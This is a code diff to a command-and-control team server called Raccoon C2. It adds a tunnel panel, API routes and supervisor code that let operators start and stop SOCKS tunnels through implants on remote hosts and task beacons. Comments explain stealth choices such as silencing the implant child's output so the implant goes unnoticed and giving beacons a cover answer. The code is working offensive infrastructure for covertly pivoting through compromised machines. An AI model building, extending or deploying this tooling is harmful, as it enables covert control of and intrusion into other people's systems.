@@ -547,6 +547,132 @@ def _beacon_config_block(gen_cfg: dict, interval: int, jitter: int,
     """)
 
 
+# ── Tunnel panel helpers ──
+#
+# The process that runs the tunnel server has no fleet table. It reports
+# each endpoint's `_implant_id` and leaves `agent` at None, because the
+# mapping from that to a fleet row is this module's knowledge and
+# `software/c2/tunnel/` may not import this module -- it would pull flask,
+# werkzeug, jinja2 and click into the process that holds every build's
+# PSK. So the link, the check-in interval, the pending state and the
+# endpoint child's own refusal are added here, on the way to the panel.
+
+
+def _agent_for_implant(implant_id) -> Optional[str]:
+    """The fleet's name for the host an endpoint reported, or None.
+
+    None is a supported answer, not a failure: an endpoint started from a
+    systemd unit has no beacon above it and so no fleet row, and its
+    tunnel is shown unlinked rather than hidden.
+    """
+    if not implant_id:
+        return None
+    for name, info in agents.items():
+        if info.get("id") == implant_id:
+            return name
+    return None
+
+
+def _tunnel_expected(agent_name: str):
+    """When that agent is next due: `(interval, seconds, "HH:MM")`.
+
+    The interval the agent reported and the last time it was heard from.
+    An agent already overdue gets `0` seconds rather than a negative
+    number: this estimate exists for an operator deciding whether to
+    wait, and "it was due four minutes ago" is what the row's own
+    last-seen says.
+    """
+    info = agents.get(agent_name) or {}
+    interval = _as_int(info.get("interval"), 300)
+    due = info.get("_last_seen_ts", 0) + interval
+    seconds = max(0, int(round(due - time.time())))
+    return (interval, seconds,
+            time.strftime("%H:%M", time.localtime(time.time() + seconds)))
+
+
+def _tunnel_pending(agent_name: str) -> Optional[dict]:
+    """That agent's `tunnel` task which it has not confirmed yet, or None.
+
+    Read from the history rather than the queue, because a task leaves
+    `task_queues` the moment it is handed over and its history entry
+    stays `pending` until the result comes back. The queue alone would
+    stop showing pending at the instant the agent was told and before it
+    had done anything -- which is the gap this whole display exists to
+    close.
+
+    Only the most recent `tunnel` task counts: an older one has been
+    answered, and the row is about what is happening now.
+    """
+    for entry in reversed(history.get(agent_name) or []):
+        if entry.get("cmd") != "tunnel":
+            continue
+        return entry if entry.get("status") == "pending" else None
+    return None
+
+
+def _tunnel_refusal(agent_name: str) -> str:
+    """The last thing that agent's `tunnel` verb refused, or "".
+
+    The endpoint child's stdout and stderr are both `DEVNULL`, and
+    deliberately so -- a child that writes to the terminal it was started
+    from is how an implant gets noticed -- so the throughput gate's
+    refusal and the config pre-flight's reach nobody. The `tunnel` verb
+    returns them as its task output, and this is where they become
+    something an operator can read instead of `exit_code: 1`.
+    """
+    for entry in reversed(history.get(agent_name) or []):
+        if entry.get("cmd") != "tunnel":
+            continue
+        output = entry.get("output")
+        if isinstance(output, str) and output.startswith("[error]"):
+            return output
+        return ""
+    return ""
+
+
+def _tunnel_row(row: dict) -> dict:
+    """One endpoint row as the panel needs it.
+
+    An endpoint is **not** the tunnel server, and this is where the
+    difference is written down: its start and stop are a task for an
+    agent, so the row carries whether one is outstanding and when the
+    agent is next expected, and the panel shows that latency rather than
+    hiding it behind a button that appears to have worked.
+    """
+    out = dict(row)
+    agent = _agent_for_implant(row.get("implant_id"))
+    out["agent"] = agent
+    out["linked"] = agent is not None
+    out["interval"] = None
+    out["pending"] = False
+    out["pending_action"] = None
+    out["expected"] = None
+    out["expected_seconds"] = None
+    out["refusal"] = ""
+    out["detail"] = ""
+    if agent is None:
+        out["detail"] = ("no fleet agent reported this host, so this "
+                         "endpoint cannot be started or stopped from here; "
+                         "it was started from a unit and is managed there")
+        return out
+
+    interval, seconds, expected = _tunnel_expected(agent)
+    out["interval"] = interval
+    out["refusal"] = _tunnel_refusal(agent)
+    task = _tunnel_pending(agent)
+    if task is not None:
+        action = (task.get("args") or "").strip() or "start"
+        out["pending"] = True
+        out["pending_action"] = action
+        out["expected"] = expected
+        out["expected_seconds"] = seconds
+        out["detail"] = (
+            "tunnel %s is queued for %s and takes effect at its next "
+            "check-in, expected about %s (it checks in every %ds)"
+            % (action, agent, expected, interval))
+    return out
+
+
 # ── Flask app ──
 
 
@@ -564,7 +690,7 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
                server_config: Optional[dict] = None,
                operator_port: Optional[int] = None,
                listener_token: Optional[str] = None,
-               supervisor=None) -> Flask:
+               supervisor=None, tunnel_supervisor=None) -> Flask:
     app = Flask(__name__)
     static_dir = Path(__file__).parent / "static"
     _server_config = server_config or {}
@@ -954,6 +1080,194 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             logger.info("Listener %s refused for %r: %s", action, name,
                         reason)
             return jsonify({"error": reason}), status
+
+    # ── The tunnel (the 🔌 panel) ──
+    #
+    # Two objects, deliberately not one. The tunnel **server** is a
+    # supervised process: start and stop are immediate and drop every
+    # endpoint at once. An **endpoint** is an agent's tunnel: start and
+    # stop are a task for that agent and take effect at its next check-in,
+    # so the answer says pending and when to expect it. A control that
+    # silently takes five minutes is the cousin of one that silently does
+    # nothing, and the only defence is to display the latency.
+
+    _TUNNEL_UNCONFIGURED = (
+        "no tunnel server is configured. Add a c2.tunnel_server block to "
+        "raccoon.yaml and restart the team server; it ships disabled, "
+        "because switching it on opens a listening socket.")
+
+    @app.route("/api/server/tunnel", methods=["GET"])
+    @require_auth
+    def api_tunnel():
+        """The tunnel server's state, and one row per endpoint.
+
+        Operator socket only. The agent socket serves the beacon endpoint
+        and the DNS tasking route and nothing else, so a beacon that
+        asked for this gets the cover answer -- which matters more here
+        than for most routes, because these can start and stop processes.
+        """
+        if tunnel_supervisor is None:
+            return jsonify({
+                "server": {"state": "unconfigured", "can_control": False,
+                           "detail": _TUNNEL_UNCONFIGURED, "pid": None,
+                           "endpoints": [], "sessions": []},
+                "endpoints": [],
+                "managed": False,
+                "detail": _TUNNEL_UNCONFIGURED,
+            })
+        state = tunnel_supervisor.status()
+        rows = [_tunnel_row(row) for row in state.pop("endpoints", None) or []]
+        return jsonify({
+            "server": state,
+            "endpoints": rows,
+            "managed": bool(state.get("can_control")),
+            "detail": "" if state.get("can_control")
+                      else state.get("detail", ""),
+        })
+
+    @app.route("/api/server/tunnel/<action>", methods=["POST"])
+    @require_auth
+    def api_tunnel_action(action):
+        """Start or stop the tunnel server process, and nothing else.
+
+        Two verbs, matched exactly. Anything else is a 404 rather than
+        something that reaches the supervisor: this route is how a panel
+        button turns into a process, and the set of things it can do
+        should be readable in one line.
+        """
+        if action not in ("start", "stop"):
+            return jsonify({"error": "the only actions are start and stop",
+                            "refused": str(action)[:64]}), 404
+        if tunnel_supervisor is None:
+            return jsonify({"error": _TUNNEL_UNCONFIGURED}), 409
+        # Counted before the process is signalled, because afterwards
+        # there is nothing left to count -- and the number is what makes
+        # the sentence below true for this deployment rather than a
+        # general warning.
+        dropped = 0
+        if action == "stop":
+            dropped = len(tunnel_supervisor.status().get("endpoints") or [])
+        try:
+            state = (tunnel_supervisor.start() if action == "start"
+                     else tunnel_supervisor.stop())
+        except SupervisorError as exc:
+            reason = str(exc)
+            # No 404 arm here, unlike the listeners': this route names no
+            # object, so there is no name to have typed wrong. Every
+            # refusal is about the state.
+            logger.info("Tunnel server %s refused: %s", action, reason)
+            return jsonify({"error": reason}), 409
+        rows = [_tunnel_row(row) for row in state.pop("endpoints", None) or []]
+        if action == "stop":
+            detail = (
+                "the tunnel server is stopped. That dropped every endpoint "
+                "at once: %d %s connected. Each one needs `tunnel start` "
+                "tasked to its agent again, which takes effect at that "
+                "agent's next check-in."
+                % (dropped, "was" if dropped == 1 else "were"))
+        else:
+            detail = (
+                "the tunnel server is running. Endpoints are not started "
+                "from here: each one dials in by itself once its agent has "
+                "been tasked `tunnel start`.")
+        _log_event("TUNNEL", "server %s (%d endpoint%s dropped)"
+                   % (action, dropped, "" if dropped == 1 else "s"))
+        return jsonify({
+            "server": state,
+            "endpoints": rows,
+            # Immediate, and said in the same word the endpoint route
+            # uses for the opposite case, so a panel can branch on it.
+            "pending": False,
+            "dropped": dropped,
+            "detail": detail,
+        })
+
+    @app.route("/api/server/tunnel/endpoint/<identity>/<action>",
+               methods=["POST"])
+    @require_auth
+    def api_tunnel_endpoint_action(identity, action):
+        """Queue `tunnel start` or `tunnel stop` for one endpoint's agent.
+
+        Nothing here touches the tunnel server process. An endpoint is
+        the implant's side of a tunnel, so the only way to start or stop
+        one is to task the agent that runs it -- which happens at its next
+        check-in, up to a whole interval away. The answer says so, with
+        the expected time, and so does the row.
+
+        404 when the identity is unknown and 409 when it is fine and the
+        state is not, which is the split `api_listener_action` makes: a
+        panel can then tell "you typed it wrong" from "it is not running".
+        """
+        if action not in ("start", "stop"):
+            return jsonify({"error": "the only actions are start and stop",
+                            "refused": str(action)[:64]}), 404
+        if tunnel_supervisor is None:
+            return jsonify({"error": _TUNNEL_UNCONFIGURED}), 409
+        state = tunnel_supervisor.status()
+        if state.get("state") != "running":
+            return jsonify({"error":
+                            "the tunnel server is not running (%s), so it "
+                            "has no endpoints to start or stop"
+                            % (state.get("detail")
+                               or state.get("state"))}), 409
+        rows = {row.get("identity"): row
+                for row in state.get("endpoints") or []}
+        row = rows.get(identity)
+        if row is None:
+            known = ", ".join(sorted(name for name in rows if name))
+            return jsonify({"error":
+                            "no endpoint called %r is connected to this "
+                            "tunnel server; have %s"
+                            % (identity, known or "none")}), 404
+        agent = _agent_for_implant(row.get("implant_id"))
+        if agent is None:
+            return jsonify({"error":
+                            "endpoint %r is not linked to a fleet agent, so "
+                            "there is nothing to task. It was started "
+                            "without a beacon above it -- from a systemd "
+                            "unit -- and has to be started and stopped "
+                            "there." % identity}), 409
+
+        task = {
+            "id": str(uuid.uuid4())[:8],
+            "cmd": "tunnel",
+            "args": action,
+            "data": "",
+            "timeout": 300,
+            "lane": "operator",
+            "queued": _now(),
+            "status": "pending",
+        }
+        task_queues.setdefault(agent, []).append(task)
+        history.setdefault(agent, []).append({
+            "task_id": task["id"],
+            "cmd": task["cmd"],
+            "args": task["args"],
+            "lane": task["lane"],
+            "timestamp": task["queued"],
+            "status": "pending",
+            "output": None,
+        })
+        interval, seconds, expected = _tunnel_expected(agent)
+        _log_event("TUNNEL", "endpoint %s: tunnel %s queued for %s "
+                   "(task_id=%s, expected ~%s)"
+                   % (identity, action, agent, task["id"], expected),
+                   agent_id=agent)
+        return jsonify({
+            "identity": identity,
+            "agent": agent,
+            "action": action,
+            "task_id": task["id"],
+            "pending": True,
+            "interval": interval,
+            "expected": expected,
+            "expected_seconds": seconds,
+            "detail": ("tunnel %s is queued for %s. It takes effect at the "
+                       "next check-in, expected about %s -- %s checks in "
+                       "every %ds -- and the row stays pending until the "
+                       "agent confirms."
+                       % (action, agent, expected, agent, interval)),
+        })
 
     @app.route("/api/server/exec", methods=["POST"])
     @require_auth
@@ -3546,6 +3860,7 @@ header .info{font-size:11px;color:var(--text2)}
     <span class="info" id="server-info">Listening</span>
     <button class="topbar-ico-btn" onclick="showBeaconGen()" title="Beacon Generator">&#128640;</button>
     <button class="topbar-ico-btn" onclick="showListeners()" title="Listeners">&#128225;</button>
+    <button class="topbar-ico-btn" onclick="showTunnel()" title="Tunnel">&#128268;</button>
     <button class="topbar-ico-btn" onclick="showLootViewer()" title="Loot">&#128142;</button>
     <button class="topbar-ico-btn" onclick="showServerLog()" title="Server Log">&#128220;</button>
     <div class="bell-wrap">
@@ -6611,6 +6926,204 @@ async function drawListeners(panel){
   });
 }
 
+async function showTunnel(){
+  const overlay = document.createElement("div");
+  overlay.className = "loot-overlay";
+  overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
+  const panel = document.createElement("div");
+  panel.className = "loot-panel";
+  overlay.appendChild(panel);
+  document.body.appendChild(overlay);
+  await drawTunnel(panel);
+}
+
+async function drawTunnel(panel){
+  const head = '<h2>&#128268; Tunnel</h2>'
+    + '<button class="loot-close" onclick="this.closest(\'.loot-overlay\').remove()">&#10005;</button>';
+  panel.innerHTML = head + '<div class="loot-loading">Loading...</div>';
+  let data;
+  try {
+    data = await api("/api/server/tunnel");
+  } catch(e) {
+    panel.innerHTML = head + '<p class="loot-empty">' + esc(String(e.message||e)) + '</p>';
+    return;
+  }
+
+  const srv = data.server || {};
+  const rows = data.endpoints || [];
+  const running = srv.state === "running";
+  const bytes = n => n >= 1048576 ? (n/1048576).toFixed(1)+" MB"
+                   : n >= 1024 ? (n/1024).toFixed(1)+" KB" : (n||0)+" B";
+
+  // The two objects, named here because the panel cannot otherwise show
+  // why one button is immediate and the other is not. A stop that
+  // silently takes five minutes is the cousin of a start button that
+  // silently does nothing, so the latency is written down rather than
+  // left for the operator to discover.
+  let html = head
+    + '<p style="font-size:12px;color:var(--dim);margin:0 0 10px">'
+    + 'The tunnel <strong>server</strong> is a separate process: endpoints '
+    + 'dial in to it and it opens one loopback SOCKS port for each. It '
+    + 'holds the Noise static key and every build\'s pre-shared key, which '
+    + 'is why it is not a listener. <strong>Stopping it drops every '
+    + 'endpoint at once.</strong> An <strong>endpoint</strong> is one '
+    + 'agent\'s tunnel, so starting or stopping one is a task that takes '
+    + 'effect at that agent\'s next check-in, not now.</p>';
+
+  // ── The server: one process, one button, immediate ──
+  html += '<div class="loot-list" id="tunnel-server-block"><div class="loot-item">'
+    + '<div><strong>Tunnel server</strong> <span style="color:var(--dim)">'
+    + esc(String(srv.bind_host||"?")) + ':' + esc(String(srv.bind_port||"?"))
+    + ' &middot; SOCKS ports ' + esc(String(srv.socks_port_first||"?"))
+    + '-' + esc(String(srv.socks_port_last||"?")) + '</span></div>'
+    + '<div style="font-size:12px">state <strong>' + esc(String(srv.state||"unknown")) + '</strong>'
+    + (srv.pid ? ' &middot; pid ' + esc(String(srv.pid)) : '')
+    + (srv.crypto ? ' &middot; crypto ' + esc(String(srv.crypto)) : '')
+    + ' &middot; ' + esc(String((srv.sessions||[]).length)) + ' relay session(s)'
+    + (srv.detail ? ' &mdash; ' + esc(String(srv.detail)) : '')
+    + '</div>'
+    + '<div style="margin-top:6px">'
+    + '<button data-tunnel-server="' + (running ? 'stop' : 'start') + '"'
+    + ' data-endpoint-count="' + esc(String(rows.length)) + '"'
+    + (data.managed ? '' : ' disabled title="' + esc(String(data.detail||srv.detail||"")) + '"')
+    + '>' + (running ? 'Stop' : 'Start') + '</button>'
+    + (running
+       ? '<span style="font-size:11px;color:var(--yellow,#d7ba7d);margin-left:8px">'
+         + 'Stopping drops every endpoint at once &mdash; '
+         + esc(String(rows.length)) + ' connected now.</span>'
+       : '')
+    + (data.managed ? '' :
+       '<span style="font-size:11px;color:var(--dim);margin-left:8px">'
+       + esc(String(data.detail||srv.detail||"")) + '</span>')
+    + '</div></div></div>';
+
+  // ── The endpoints: one row per identity, each one a task away ──
+  html += '<h3 style="font-size:13px;margin:12px 0 6px">Endpoints</h3>';
+  if(!rows.length){
+    html += '<p class="loot-empty">'
+      + esc(data.detail || "No endpoint has connected to this tunnel server yet.")
+      + '</p>';
+  }
+  html += '<div class="loot-list" id="tunnel-endpoint-rows">';
+  rows.forEach(row => {
+    const connected = row.state === "connected";
+    const socks = row.socks;
+    html += '<div class="loot-item">'
+      + '<div><strong>' + esc(row.identity) + '</strong>'
+      + ' <span style="color:var(--dim)">SOCKS 127.0.0.1:' + esc(String(row.port))
+      + ' &middot; ' + (row.linked ? 'agent ' + esc(row.agent) : 'unlinked')
+      + '</span></div>'
+      + '<div style="font-size:12px">state <strong>' + esc(row.state) + '</strong>'
+      + (row.hostname ? ' &middot; ' + esc(row.hostname) : '')
+      + (row.os ? ' &middot; ' + esc(row.os) : '')
+      + (row.peer ? ' &middot; from ' + esc(row.peer) : '')
+      + ' &middot; ' + esc(String(row.sessions)) + ' session(s)'
+      + (socks ? '/' + esc(String(socks.max_sessions)) : '')
+      + ' &middot; in ' + esc(bytes(row.bytes_in))
+      + ' out ' + esc(bytes(row.bytes_out))
+      + '</div>'
+      // The crypto path, per row. A tunnel on the pure-Python cipher
+      // moves roughly 50-200 KB/s, and an operator who cannot see that
+      // spends the afternoon looking for a network fault that is not
+      // there.
+      + '<div style="font-size:11px;color:'
+      + (row.crypto === "pure-python" ? 'var(--yellow,#d7ba7d)' : 'var(--dim)') + '">'
+      + 'crypto ' + esc(row.crypto)
+      + (row.crypto === "pure-python"
+         ? ' &mdash; pure-python AES-GCM, roughly 50-200 KB/s: a scan through '
+           + 'this tunnel is slow because of the cipher, not the network'
+         : '')
+      + '</div>'
+      + (socks && socks.refused
+         ? '<div style="font-size:11px;color:var(--dim)">'
+           + esc(String(socks.refused)) + ' refused on the SOCKS port'
+           + ' (auth ' + esc(String(socks.refused_auth))
+           + ', capacity ' + esc(String(socks.refused_capacity))
+           + ', tunnel ' + esc(String(socks.refused_tunnel)) + ')</div>'
+         : '')
+      + (row.socks_detail
+         ? '<div style="font-size:11px;color:var(--dim)">' + esc(row.socks_detail) + '</div>'
+         : '')
+      + (row.username
+         ? '<div style="font-size:11px;color:var(--dim)">'
+           + 'SOCKS5 user/pass per RFC 1929: ' + esc(row.username)
+           + ' / ' + esc(row.password) + '</div>'
+         : '')
+      // Why a tunnel refused to start. The endpoint child's stderr is
+      // closed, so this sentence reaches an operator here or nowhere.
+      + (row.refusal
+         ? '<div style="font-size:11px;color:var(--red,#ff1a1a)">' + esc(row.refusal) + '</div>'
+         : '')
+      + '<div style="margin-top:6px">'
+      + (row.pending
+         ? '<button disabled>pending until ~' + esc(row.expected) + '</button>'
+         : '<button data-tunnel-endpoint="' + esc(row.identity) + '"'
+           + ' data-endpoint-action="' + (connected ? 'stop' : 'start') + '"'
+           + (row.linked ? '' : ' disabled title="' + esc(row.detail) + '"')
+           + '>' + (connected ? 'Stop' : 'Start') + '</button>')
+      + (row.detail
+         ? '<span style="font-size:11px;color:var(--dim);margin-left:8px">'
+           + esc(row.detail) + '</span>'
+         : '')
+      + '</div></div>';
+  });
+  html += '</div>';
+  panel.innerHTML = html;
+
+  // Handlers attached here rather than written into an onclick
+  // attribute. An identity, a hostname and a refusal all come from
+  // outside this process, and a handler body built as a string is the
+  // defect class the hardening pass of November 2026 removed from this
+  // file.
+  panel.querySelectorAll('button[data-tunnel-server]').forEach(btn => {
+    if(btn.disabled) return;
+    btn.addEventListener("click", async () => {
+      const action = btn.getAttribute("data-tunnel-server");
+      const count = btn.getAttribute("data-endpoint-count");
+      // Asked before anything is sent: this is the one control here that
+      // takes something away from every operator at once.
+      if(action === "stop" && !confirm(
+           "Stopping the tunnel server drops every endpoint at once: "
+           + count + " connected now. Each one has to be tasked "
+           + "'tunnel start' again, which takes effect at that agent's "
+           + "next check-in. Stop it?")) return;
+      btn.disabled = true;
+      btn.textContent = action === "start" ? "Starting..." : "Stopping...";
+      try {
+        const r = await fetch("/api/server/tunnel/" + action,
+                              {method:"POST", headers:H()});
+        const body = await r.json();
+        if(!r.ok) alert(body.error || ("tunnel server " + action + " failed"));
+        else if(body.detail) alert(body.detail);
+      } catch(e) {
+        alert(String(e.message||e));
+      }
+      await drawTunnel(panel);
+    });
+  });
+
+  panel.querySelectorAll('button[data-tunnel-endpoint]').forEach(btn => {
+    if(btn.disabled) return;
+    btn.addEventListener("click", async () => {
+      const identity = btn.getAttribute("data-tunnel-endpoint");
+      const action = btn.getAttribute("data-endpoint-action");
+      btn.disabled = true;
+      btn.textContent = "Queueing...";
+      try {
+        const r = await fetch("/api/server/tunnel/endpoint/"
+                              + encodeURIComponent(identity) + "/" + action,
+                              {method:"POST", headers:H()});
+        const body = await r.json();
+        if(!r.ok) alert(body.error || ("tunnel " + action + " failed"));
+        else if(body.detail) alert(body.detail);
+      } catch(e) {
+        alert(String(e.message||e));
+      }
+      await drawTunnel(panel);
+    });
+  });
+}
+
 async function showLootViewer(){
   const overlay = document.createElement("div");
   overlay.className = "loot-overlay";
@@ -8315,6 +8828,44 @@ def _build_supervisor(args, parser):
                       listener_token=token)
 
 
+def _build_tunnel_supervisor(args, parser):
+    """A TunnelSupervisor for `c2.tunnel_server` in `--config`, or None.
+
+    Imported here rather than at the top of the file for the reason
+    `_build_supervisor` is: a deployment that configures no tunnel server
+    should not load the module that spawns one. This import is cheaper
+    than the listeners' -- the supervisor spawns a child and holds no
+    protocol code at all -- but the rule is the same one.
+
+    A block that cannot be run is fatal with the field named, rather than
+    a warning. A tunnel server that was silently not configured shows up
+    as an endpoint that never appears, and so do a wrong PSK, a blocked
+    egress and a proxy that refuses CONNECT; an operator chasing it has
+    no way to tell those apart.
+    """
+    if not args.config:
+        return None
+
+    import yaml
+
+    from software.c2.tunnel.supervisor import (TunnelSupervisor,
+                                               tunnel_server_config)
+
+    try:
+        with open(args.config) as handle:
+            config = yaml.safe_load(handle) or {}
+    except (OSError, yaml.YAMLError) as exc:
+        parser.error("could not read %s: %s" % (args.config, exc))
+    try:
+        block = tunnel_server_config(config)
+    except ValueError as exc:
+        parser.error("%s: %s" % (args.config, exc))
+    if block is None:
+        return None
+    return TunnelSupervisor(block, Path(args.data_dir),
+                            managed=not args.no_manage_listeners)
+
+
 def main():
     parser = argparse.ArgumentParser(
         description="Raccoon C2 Team Server",
@@ -8351,17 +8902,17 @@ def main():
     )
     parser.add_argument(
         "--config",
-        help="raccoon.yaml to read c2.listeners from, so the 📡 panel can "
-             "list, start and stop them. Without it the panel says that "
-             "none are configured, which is what every deployment before "
-             "this feature should see.")
+        help="raccoon.yaml to read c2.listeners and c2.tunnel_server from, "
+             "so the 📡 and 🔌 panels can list, start and stop them. "
+             "Without it both panels say that nothing is configured, which "
+             "is what every deployment before these features should see.")
     parser.add_argument(
         "--no-manage-listeners", action="store_true",
-        help="List and report on listeners but refuse to start or stop "
-             "them. For a team server that has no business spawning "
-             "processes -- in a container, where mounting the Docker "
-             "socket would hand the container its host. The panel then "
-             "disables its controls and states the reason.")
+        help="List and report on listeners and the tunnel server but "
+             "refuse to start or stop them. For a team server that has no "
+             "business spawning processes -- in a container, where mounting "
+             "the Docker socket would hand the container its host. Both "
+             "panels then disable their controls and state the reason.")
     args = parser.parse_args()
     # 0 would bind an ephemeral port that the socket policy never matches:
     # the GUI would be locked out, or beacons sent nowhere, with nothing said.
@@ -8428,10 +8979,12 @@ def main():
         "start_time": time.time(),
     }
     supervisor = _build_supervisor(args, parser)
+    tunnel_supervisor = _build_tunnel_supervisor(args, parser)
     app = create_app(crypto, operator_token, data_dir, server_config=srv_config,
                      operator_port=args.operator_port if split else None,
                      listener_token=os.environ.get("RACCOON_LISTENER_TOKEN"),
-                     supervisor=supervisor)
+                     supervisor=supervisor,
+                     tunnel_supervisor=tunnel_supervisor)
 
     if not split:
         network = (f"  Listen:   {proto}://{args.host}:{args.port}"
@@ -8485,7 +9038,15 @@ def main():
                for host, port in listeners]
     for extra in servers[1:]:
         threading.Thread(target=extra.serve_forever, daemon=True).start()
-    servers[0].serve_forever()
+    try:
+        servers[0].serve_forever()
+    finally:
+        # The tunnel server is a child of this process and holds the
+        # implant-facing port and every build's PSK in memory. Left
+        # behind it would keep that port against the next start, and the
+        # operator would have no panel to stop it from.
+        if tunnel_supervisor is not None:
+            tunnel_supervisor.stop_all()
 
 
 def _is_loopback(host: str) -> bool:
